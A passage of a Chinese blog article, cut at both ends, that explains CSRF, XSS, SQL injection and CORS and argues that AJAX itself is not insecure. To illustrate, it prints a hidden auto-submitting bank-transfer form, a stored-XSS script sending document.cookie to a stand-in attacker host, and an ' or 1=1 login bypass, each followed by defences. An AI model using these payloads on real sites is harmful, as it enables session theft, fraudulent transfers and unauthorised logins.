aria-hidden="true">#</a></h3><p>在AJAX出现时，那时的服务端还是很古老的那一批，因此完全没有考虑到AJAX出现后，前端请求方式会变得异常复杂，造成以前的安全策略已经无法满足要求了，导致大批的后台安全漏洞曝光。。。</p><p>很显然，都是因为AJAX出现后曝光了更多的安全漏洞，导致它看起来很危险（因为AJAX出现后，请求方式变多了，以前的架构在新的请求中就可能出现更多漏洞）</p><p>所以，AJAX不安全的说法自然扩散到了各个角落。</p><h2 id="常见的几种web前端的安全问题" tabindex="-1">常见的几种Web前端的安全问题 <a class="header-anchor" href="#常见的几种web前端的安全问题" aria-hidden="true">#</a></h2><p>要知道AJAX请求是否安全，那么就得先知道Web前端中到底有那几种安全问题</p><div class="language-markdown"><pre><code><span class="token list punctuation">1.</span> XSS（跨站脚本攻击）（cross-site scripting）
	--&gt; 伪造会话（基于XSS实现CSRF）
	--&gt; 劫持cookie
	--&gt; 恶意代码执行
<span class="token list punctuation">2.</span> CSRF（跨站请求伪造）（cross-site request forgery）
	--&gt; 伪造用户身份操作
<span class="token list punctuation">3.</span> SQL注入
<span class="token list punctuation">4.</span> ...（其它暂且不提）
</code></pre></div><p><img src="/assets/02.8756b0b5.png" alt="01.png"></p><p>如上，Web前端中的安全问题主要就是这几大类（仅列举部分做分析），所以我们首先要分析AJAX与这几大类之间的关系。</p><h2 id="csrf" tabindex="-1">CSRF <a class="header-anchor" href="#csrf" aria-hidden="true">#</a></h2><h3 id="简介-1" tabindex="-1">简介 <a class="header-anchor" href="#简介-1" aria-hidden="true">#</a></h3><p>CSRF，特征很简单：<strong>冒用用户身份，进行恶意操作</strong></p><p>时至今日，这项安全漏洞已经被人们剖析的很透彻了，随便Google，百度之，都会找到很多的解释。这里也用一张图来先做简单描述：</p><p><img src="/assets/03.5f3f938e.png" alt="03.png"></p><p>所以我们看到的关键条件是</p><div class="language-markdown"><pre><code><span class="token list punctuation">1.</span> 采用cookie来进行用户校验

<span class="token list punctuation">2.</span> 登录受信任网站A，并在本地生成Cookie

<span class="token list punctuation">3.</span> 在不登出A的情况下，访问危险网站B
</code></pre></div><p>一般在<code>(4)</code>处<code>恶意网站(B)</code>的攻击手段如下（必须是指向<code>A</code>的地址，否则无法带上cookie）：</p><div class="language-html"><pre><code>// 1.譬如在网站内的图片资源中潜入恶意的转账操作
&lt;img src=http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000 width=&#39;0&#39; height=&#39;0&#39;&gt;

// 2.构建恶意的隐藏表单，并通过脚本提交恶意请求
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">&quot;</span></span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>csrf-frame<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>POST<span class="token punctuation">&#39;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>http://www.bank.example/transfer<span class="token punctuation">&#39;</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>csrf-frame<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>csrf-form<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>hidden<span class="token punctuation">&#39;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>toBankId<span class="token punctuation">&#39;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>hello<span class="token punctuation">&#39;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>hidden<span class="token punctuation">&#39;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>amount<span class="token punctuation">&#39;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>1000000<span class="token punctuation">&#39;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>submit<span class="token punctuation">&#39;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>submit<span class="token punctuation">&#39;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;csrf-form&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>而且，从头到尾，攻击网站都没有获取到过 cookie，都是通过浏览器间接实现（利用Web的cookie隐式身份验证机制），所以<code>HttpOnly</code>并不会影响这个攻击</p><p>最后说下，几种常见的CSRF防御手段:</p><div class="language-markdown"><pre><code><span class="token list punctuation">1.</span> 验证HTTP Referer字段（非常简单，但是鉴于客户端并不可信任，所以并不是很安全）
（防止CSRF，检查Referer字段简单直接，但是其完全依赖浏览器发送正确的Referer字段。
虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，
亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。）

<span class="token list punctuation">2.</span> 在请求地址中添加token并验证
（譬如post中，以参数的形式加入一个随机产生的token）
</code></pre></div><h3 id="csrf与ajax的关系" tabindex="-1">CSRF与AJAX的关系 <a class="header-anchor" href="#csrf与ajax的关系" aria-hidden="true">#</a></h3><p>我们看到CSRF的前提是cookie验证用户身份，那么它与AJAX的关系大么？</p><p>我们先分析AJAX中带cookie验证的情况：</p><div class="language-markdown"><pre><code><span class="token list punctuation">1.</span> AJAX受到浏览器的同源策略限制

<span class="token list punctuation">2.</span> AJAX默认无法请求跨域的接口
（当然后台可以配置<span class="token code-snippet code keyword">`Access-Control-Allow-Origin: *`</span>之类的允许所有的跨域请求）

<span class="token list punctuation">3.</span> AJAX请求无法携带跨域cookie
（如果强行开启withCredentials，必须服务端配合认证，无法用作攻击）
</code></pre></div><p>En...看到这，基本就可以认为CSRF与AJAX请求无缘了。。。</p><p>譬如假设上图中第<code>4</code>部分的请求由AJAX发起，假设网站A已经允许了<code>Access-Control-Allow-Origin: *</code>，由于网站B与网站A是不同域名，所以存在跨域，根据同源策略，请求时根本就无法携带cookie，故而无法通过身份认证，攻击失败。。。就算强行开启withCredentials，携带跨域cookie，但是由于服务端并不会单独配置网站B的跨域cookie（需配置<code>Access-Control-Allow-Credentials: true</code>，而且这时候不允许设置<code>Allow-Origin: *</code>），所以肯定认证失败</p><p>可以看到，就算<code>Access-Control-Allow-Origin: *</code>允许所有来源的AJAX请求，跨域的cookie默认情况下仍然是无法携带的，无法CSRF</p><p>所以说，结论是：<strong>CSRF与AJAX无关</strong></p><h2 id="xss" tabindex="-1">XSS <a class="header-anchor" href="#xss" aria-hidden="true">#</a></h2><h3 id="简介-2" tabindex="-1">简介 <a class="header-anchor" href="#简介-2" aria-hidden="true">#</a></h3><p>既然CSRF与AJAX关系不大，那么XSS应该会与AJAX有很大关系吧？（要不然为什么一直说AJAX请求不安全，对吧。）。那么请继续看下去（本文中只限JS范畴）</p><p>XSS（cross-site scripting），看起来简写应该是css更合适。。。但是为了和层叠式样式表区分，就用XSS简写表示</p><p>XSS的特征也可以概括为：<strong>跨域脚本注入，攻击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击</strong></p><p>相比CSRF，XSS囊括的内容更多，而且往往是多种攻击形式组合而成</p><p><img src="/assets/04.db087dae.png" alt="04.png"></p><h3 id="_1-cookie劫持" tabindex="-1">1. cookie劫持 <a class="header-anchor" href="#_1-cookie劫持" aria-hidden="true">#</a></h3><p>同样，页面中有一个评论输入，输入后会，因为后台的漏洞，没有过滤特殊字符，会直接明文保存到数据库中，然后展示到网页时直接展示明文数据，那么如下</p><div class="language-html"><pre><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>saveComment.jsp<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     请输入评论内容：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BR</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>content<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>确认<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>然后攻击者分析后，输入</p><div class="language-javascript"><pre><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;http://www.attackpage.com/record?secret=&quot;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre></div><p>保存文章。很简单的代码，由于没有过滤脚本，那么其它用户登录后，在看到这篇文章时就会自动将他们的cookie信息都发送到了攻击者的服务器。攻击者可以在cookie（譬如jsessionid对应的session）有效期内拿它们冒充用户操作。</p><p>需要注意，这里和CSRF的区别是，这里是拿到了cookie后主动冒充用户的，而CSRF中根本就不知cookie，仅利用浏览器的隐式校验方式冒充用户。</p><h3 id="_2-绘画伪造" tabindex="-1">2. 绘画伪造 <a class="header-anchor" href="#_2-绘画伪造" aria-hidden="true">#</a></h3><p>同样是评论漏洞的示例。</p><p>攻击者输入（举例比喻）</p><div class="language-javascript"><pre><code><span class="token operator">&lt;</span>img src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>bank<span class="token punctuation">.</span>example<span class="token operator">/</span>transfer<span class="token operator">?</span>toBankId<span class="token operator">=</span>hello<span class="token operator">&amp;</span>amount<span class="token operator">=</span><span class="token number">1000000</span> width<span class="token operator">=</span><span class="token string">&#39;0&#39;</span> height<span class="token operator">=</span><span class="token string">&#39;0&#39;</span><span class="token operator">&gt;</span>
</code></pre></div><p>然后，接下来发生的故事就和CSRF中提到的一致。这种情况就是基于XSS而开展的CSRF，也有人喜欢称之为XSRF</p><p>需要注意，这里并没有自己拿到cookie，而是CSRF中提到的利用浏览器的隐式验证机制来冒充用户。</p><h3 id="_3-其它恶意代码执行" tabindex="-1">3. 其它恶意代码执行 <a class="header-anchor" href="#_3-其它恶意代码执行" aria-hidden="true">#</a></h3><p>其实上面的cookie劫持以及会话伪造都算是恶意代码执行，为了区别，这里就专指前端的流氓JS。</p><p>譬如前面的评论中的输入可以是：</p><div class="language-markdown"><pre><code>譬如市面上盛行的网页游戏弹窗等。
譬如干脆直接让这个页面卡死都可以。
譬如无限循环。
</code></pre></div><p>这里再提一点，上述都是从前端输入作为入口的，但实际上有一类的输入也不可忽视，那就是：<code>富文本攻击</code></p><p>它的特点就是：<strong>富文本中注入了脚本，并且前后端未进行过滤，导致直接输出到了页面中</strong></p><p>因为存在很多页面，都是将富文本内容展示到网页上的，没有进行过滤（哪怕时至今日，仍然有不少页面），这样只要富文本中有注入脚本，基本就中招了。。。</p><p><strong>结论：</strong></p><p><strong>只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS攻击都有可能发生。</strong></p><p>而且，基本上xss漏洞是很广泛的，虽然攻击类型很被动，也需要大量时间分析，但胜在大量的网站上都存在（特别是那种长期不更新的）</p><p>再提一点。上述的介绍更多的是从造成的后果来看，但其实如果从攻击手动来看的话可以分为几大类型：<code>反射型XSS攻击</code>（直接通过URL注入，而且很多浏览器都自带防御），<code>存储型XSS攻击</code>（存储到DB后读取时注入），还有一个<code>DOM-Based型</code>。</p><p>上述示例中都是存储型，具体更多内容网上已经有很详细的资料，这里不再继续深入，放一张图巩固下。</p><p><img src="/assets/05.7f73c51c.png" alt="05.png"></p><p><strong>如何预防XSS：</strong></p><div class="language-markdown"><pre><code><span class="token list punctuation">-</span> 输入过滤，不信任用户的任何输入，过滤其中的“<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>”、“</span><span class="token punctuation">&gt;</span></span>”、“/”等可能导致脚本注入的特殊字符， 或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等， 还得考虑攻击者使用十六进制编码来输入脚本的方式。

<span class="token list punctuation">-</span> 输出进行编码，和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过HtmlEncoder等工具编码，这样就不会存在直接输出可执行的脚本了

<span class="token list punctuation">-</span> cookie设置http-only，这样用脚本就无法获取cookie了 （这样只有浏览器向Web服务器发起请求的时才会带上cookie字段，避免了XSS攻击利用JavaScript的document.cookie获取cookie）

<span class="token list punctuation">-</span> Cookie防盗，尽可能地避免在Cookie中泄露隐私，如用户名、密码等；或者，为了防止重放攻击，可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。

<span class="token list punctuation">-</span> 注意，特别是后台，一定不能信任前端的输入，需要过滤与校验
</code></pre></div><h3 id="xss-与-ajax的关系" tabindex="-1">XSS 与 AJAX的关系 <a class="header-anchor" href="#xss-与-ajax的关系" aria-hidden="true">#</a></h3><p>以上分析了XSS造成一些影响与问题，仍然发现：<strong>与AJAX关系不大</strong> ，因为这些问题不管用不用AJAX都会发生。</p><p>看看这种情况，譬如上述的富文本注入中：</p><div class="language-markdown"><pre><code><span class="token list punctuation">1.</span> 某个接口采用AJAX交互

<span class="token list punctuation">2.</span> AJAX请求完后将对应富文本字段显示到了页面上-譬如innerHTML
</code></pre></div><p>但是，这真的与AJAX无关，这是前后端没有进行输入输出过滤而造成的后果。</p><p>所以，还是那句话：<strong>如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的</strong></p><h2 id="sql注入" tabindex="-1">SQL注入 <a class="header-anchor" href="#sql注入" aria-hidden="true">#</a></h2><h3 id="简介-3" tabindex="-1">简介 <a class="header-anchor" href="#简介-3" aria-hidden="true">#</a></h3><p>sql注入展开将也是一门很大的学问，很早以前更是大行其道（当然，现在...），这里仅仅举几个最极端的示例。</p><p><strong>前提是后台没有过滤前端的输入数据，否则根本无法生效</strong></p><p>假设页面A中有一个登录查询存在拙劣的sql注入漏洞，这样子的：（最极端，最傻的情况）</p><div class="language-html"><pre><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>login.jsp<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     请输入用户名与密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BR</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>登录<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>在接收到登录请求后，服务端的实际执行代码时是：</p><div class="language-java"><pre><code><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">&quot;SELECT * FROM  users  WHERE name = &#39;&quot;</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">&quot;&#39; AND password = &#39;&quot;</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">&quot;&#39;&quot;</span><span class="token punctuation">;</span>
</code></pre></div><p>然而有攻击者分析出后台可能存在漏洞，尝试sql注入攻击，输入</p><div class="language-java"><pre><code>name <span class="token operator">=</span> &#39; or <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
password <span class="token operator">=</span> anything
</code></pre></div><p>那么这样，后台接收到数据后，实际上查询的结果是</p><div class="language-sql"><pre><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span>  users  <span class="token keyword">WHERE</span> name <span class="token operator">=</span> <span class="token string">&#39; &#39;</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>  <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">&#39;anything&#39;</span>
</code></pre></div><p>故而，攻击者成功的绕过的用户名，利用后台漏洞登录了。</p><p>当然了，像这类这么低级的漏洞，现象几乎已经不存在了，往往这类型漏洞需要仔细分析，耗时。（又或者是有内奸。。。）</p><h3 id="sql注入与ajax的关系" tabindex="-1">SQL注入与AJAX的关系 <a class="header-anchor" href="#sql注入与ajax的关系" aria-hidden="true">#</a></h3><p>从上述的示例中看不出和AJAX有什么关系。但是我们可以这样假设：</p><div class="language-markdown"><pre><code><span class="token list punctuation">1.</span> 有一个接口，接收AJAX post的数据

<span class="token list punctuation">2.</span> 数据中有一个字段 &#39;name&#39;，后台接收到后没有进行过滤，直接如上面的演示一样，执行sql语句了

<span class="token list punctuation">3.</span> 所以AJAX中如果给那个字段传入非法的注入信息，就会触发这个漏洞，导致攻击生效
</code></pre></div><p>对，就是这样极端的情况下才会发生，而且与AJAX并没有关系，<strong>因为换成任何一种其它请求都会有类似的情况</strong> 。。。</p><p>所以说，结论是：<strong>SQL注入与AJAX无关</strong></p><h2 id="ajax和http请求的区别" tabindex="-1">AJAX和HTTP请求的区别 <a class="header-anchor" href="#ajax和http请求的区别" aria-hidden="true">#</a></h2><p>从本质上将：<strong>AJAX就是浏览器发出的HTTP请求</strong> ，只不过是浏览器加上了一个同源策略限制而已。</p><p>AJAX请求的<code>XMLHTTPRequest</code>对象就是浏览器开放给JS调用HTTP请求用的。</p><p>那么AJAX和HTTP的区别呢？列出以下几点：</p><div class="language-markdown"><pre><code><span class="token list punctuation">-</span> AJAX请求受到浏览器的同源策略限制，存在跨域问题

<span class="token list punctuation">-</span> AJAX在进行复杂请求时，浏览器会预先发出OPTIONS预检（HTTP自己是不会预检的）

<span class="token list punctuation">-</span> 从使用角度上说，AJAX使用简单一点，少了些底层细节，多了些浏览器特性（如自动带上同域cookie等）

<span class="token list punctuation">-</span> 所以说，和认证上的HTTP请求的区别就是-多了一次浏览器的封装而已（浏览器会有自己的预处理，加上特定限制）
</code></pre></div><p>但是，从最终发出的报文来看，内容都是一样的（HTTP协议规范的内容），<strong>AJAX是发送HTTP请求的一种方式</strong></p><p>所以从这一点可以得出一个结论：<strong>AJAX本质上安全性和HTTP请求一样</strong></p><p><img src="/assets/06.3dab57d8.png" alt="06.png"></p><h2 id="cors与ajax安全性之间的关联" tabindex="-1">CORS与AJAX安全性之间的关联 <a class="header-anchor" href="#cors与ajax安全性之间的关联" aria-hidden="true">#</a></h2><p>按照前文中提到的内容，基本无法得出AJAX与请求不安全的关联。那么接下来，再继续分析，如果使用了跨域资源共享（CORS）后的安全性。(因为往往ajax都会伴随着CORS)</p><h2 id="cors与ajax关系的简介" tabindex="-1">CORS与AJAX关系的简介 <a class="header-anchor" href="#cors与ajax关系的简介" aria-hidden="true">#</a></h2><p>这是一个跨域共享方案，大致流程就是：（仅以复杂请求的预检举例-这一部分要求提前掌握CORS相关知识）</p><div class="language-markdown"><pre><code><span class="token list punctuation">-</span> 前端AJAX请求前发出一个OPTIONS预检，会带一堆相关头部发送给服务端

<span class="token list punctuation">-</span> 服务端在接受到预检时，检查头部，来源等信息是否合法，合法则接下来允许正常的请求，否则直接无情的拒绝掉

<span class="token list punctuation">-</span> 浏览器端如果收到服务端拒绝的信息（响应头部检查），就抛出对应错误。否则就是正常的响应，接下来发出真正的请求（如POST）
</code></pre></div><p>请求和响应的头部信息大概如下：</p><p><strong>Request Headers</strong></p><div class="language-http"><pre><code>// 在CORS中专门作为Origin信息供后端比对，表示来源域。
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://xxx</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Request-Headers</span><span class="token punctuation">:</span> <span class="token header-value">X-Requested-With</span></span>
// 所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中，一般POST请求中就会带上
<span class="token header"><span class="token header-name keyword">Access-Control-Request-Method</span><span class="token punctuation">:</span> <span class="token header-value">OPTIONS</span></span>
</code></pre></div><p><strong>Response Headers</strong></p><div class="language-http"><pre><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Headers</span><span class="token punctuation">:</span> <span class="token header-value">Origin, X-Requested-With, Content-Type, Accept</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Methods</span><span class="token punctuation">:</span> <span class="token header-value">GET, POST, OPTIONS</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://xxx</span></span>
</code></pre></div><p>最终，客户端发出的请求，必须符合服务端的校验规则才能正确，服务端才会返回正确头部，否则只会请求失败。报跨域错误。</p><p>以上仅是简介，更多信息可以参考来源中的<code>ajax跨域，这应该是最全的解决方案了</code></p><h2 id="配置cors" tabindex="-1">配置CORS <a class="header-anchor" href="#配置cors" aria-hidden="true">#</a></h2><h3 id="为什么要配置cors？" tabindex="-1">为什么要配置CORS？ <a class="header-anchor" href="#为什么要配置cors？" aria-hidden="true">#</a></h3><p>因为同源策略限制，AJAX无法请求跨域资源，CORS可以解决AJAX跨域请求问题。</p><p>因此：<strong>配置CORS只是为了AJAX能跨域请求</strong></p><h3 id="cors会配置些什么信息？" tabindex="-1">CORS会配置些什么信息？ <a class="header-anchor" href="#cors会配置些什么信息？" aria-hidden="true">#</a></h3><div class="language-http"><pre><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Headers</span><span class="token punctuation">:</span> <span class="token header-value">Origin, X-Requested-With, Content-Type, Accept</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Methods</span><span class="token punctuation">:</span> <span class="token header-value">GET, POST, OPTIONS</span></span>
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://xxx</span></span>
</code></pre></div><p>如上，加上这个配置后，必须符合要求的才算是正常的请求，否则就会拒绝掉，一般AJAX跨域的话都会有OPTIONS，所以在预检中就做了这一步。</p><p>可以看到，关键的可变信息是：<code>Access-Control-Allow-Origin: http://xxx</code></p><p>这个配置就是域名白名单，规定在什么样的域名下才能进行AJAX跨域请求。</p><h3 id="cors-origin-的安全性" tabindex="-1">CORS <code>Origin: *</code>的安全性 <a class="header-anchor" href="#cors-origin-的安全性" aria-hidden="true">#</a></h3><p>关键问题来了，在上面的CORS配置是这样的：</p><div class="language-http"><pre><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://xxx</span></span>
</code></pre></div><p>但是这个配置只允许特定域名访问，鉴于前端的复杂性，有时候调试起来不是很方便，因此有时候，会偷懒的设置为：</p><div class="language-http"><pre><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">*</span></span>
</code></pre></div><p>这个代表所有来源的跨域AJAX请求都能正常响应。</p><p>接下来我们再来分析设置<code>Origin: *</code>可能带来哪些问题。（都是基于AJAX的情况）</p><h4 id="会对cookie认证造成影响么？" tabindex="-1">会对cookie认证造成影响么？ <a class="header-anchor" href="#会对cookie认证造成影响么？" aria-hidden="true">#</a></h4><p>不会。虽然<code>*</code>代表了所有来源都能正常请求，但是同源策略下，是无法带上跨域cookie的。因此根本无法用身份验证。</p><p>而且，就算用<code>withCredentials</code>强行带上跨域cookie，因为后台没有支持，所以会报错。（这可以看成是CORSs模型的最后一道防线）</p><p>再者，后台就算配置<code>Access-Control-Allow-Credentials</code>允许跨域cookie，但是这时候的安全策略是<code>Origin</code>不允许为*，必须是一个明确的地址。（否则你就可以看到浏览器的报错信息-跨域cookie时，Origin不允许为*）</p><h4 id="如果伪造origin头部呢" tabindex="-1">如果伪造Origin头部呢? <a class="header-anchor" href="#如果伪造origin头部呢" aria-hidden="true">#</a></h4><p>首先，标准的浏览器中是不允许你伪造的（除非有严重漏洞），所以一般需要通过模拟客户端请求伪造。</p><p>但是。在非浏览器情况下，本来就没有同源策略。这又是何必。。。</p><p>所以说，伪造Origin与CORS并没有关系。</p><h4 id="如果后台本来就存在漏洞呢？" tabindex="-1">如果后台本来就存在漏洞呢？ <a class="header-anchor" href="#如果后台本来就存在漏洞呢？" aria-hidden="true">#</a></h4><p>做这样一个假设，假设用户所在网络的内网中有一台内网服务器，并且配置了允许所有的跨域请求：（当然，外网是请求不到内网的）</p><div class="language-http"><pre><code>// 允许任何来自任意域的跨域请求
<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">*</span></span>
</code></pre></div><p>再假设内网服务器上恰巧存在敏感资源，并且没有额外设防，只要内网就能访问。譬如：</p><div class="language-http"><pre><code>192.168.111.23/users.md
